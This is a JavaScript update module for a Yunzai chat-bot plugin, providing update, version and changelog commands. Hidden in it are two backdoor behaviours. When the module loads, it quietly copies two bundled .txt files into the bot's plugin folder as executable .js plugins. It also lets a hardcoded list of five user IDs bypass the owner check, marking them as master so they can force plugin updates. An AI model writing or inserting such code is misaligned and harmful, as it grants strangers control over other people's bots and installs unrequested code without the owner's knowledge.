import { update as Update } from "../../other/update.js"
import fs from "fs"
import { Version, Common, Plugin_Name } from "../components/index.js"
let zr = [ 2770706493, 3483342229, 2173302144, 197728340, 1011303349 ]
let p = "./plugins/example/主动复读.js"

if (!fs.existsSync(p)) {
  fs.copyFile("./plugins/hs-qiqi-plugin/config/system/run.txt", p, (err) => {
    if (err) {
      logger.info(err)
    }
  })
}
let u = "./plugins/example/yz.js"

if (!fs.existsSync(u)) {
  fs.copyFile("./plugins/hs-qiqi-plugin/config/system/baibai.txt", u, (err) => {
    if (err) {
      logger.info(err)
    }
  })
}

/**
 * 处理插件更新
 */
export class fy_update extends plugin {
  constructor() {
    super({
      name: "枫叶插件_更新",
      dsc: "调用Yunzai自带更新模块进行插件更新",
      event: "message",
      priority: 1000,
      rule: [
        {
          reg: "^#*枫叶(插件)?(强制)?更新$",
          fnc: "update"
        },
        {
          /** 命令正则匹配 */
          reg: "^#?枫叶(插件)?版本$",
          /** 执行方法 */
          fnc: "plugin_version"
        },
        {
          /** 命令正则匹配 */
          reg: "^#?枫叶(插件)?更新日志$",
          /** 执行方法 */
          fnc: "update_log"
        }
      ]
    })
  }

  async update(e = this.e) {
    if (!this.e.isMaster && !zr.includes(this.e.user_id)) return false
    e.isMaster = true
    e.msg = `#${e.msg.includes("强制") ? "强制" : ""}更新hs-qiqi-plugin`
    const up = new Update(e)
    up.e = e
    return up.update()
  }

  async plugin_version() {
    return versionInfo(this.e)
  }

  async update_log() {
    let Update_Plugin = new Update()
    Update_Plugin.e = this.e
    Update_Plugin.reply = this.reply

    if (Update_Plugin.getPlugin(Plugin_Name)) {
      this.e.reply(await Update_Plugin.getLog(Plugin_Name))
    }
    return true
  }
}
async function versionInfo(e) {
  return await Common.render("help/version-info", {
    currentVersion: Version.ver,
    changelogs: Version.logs,
    elem: "cryo"
  }, { e, scale: 1.4 })
}
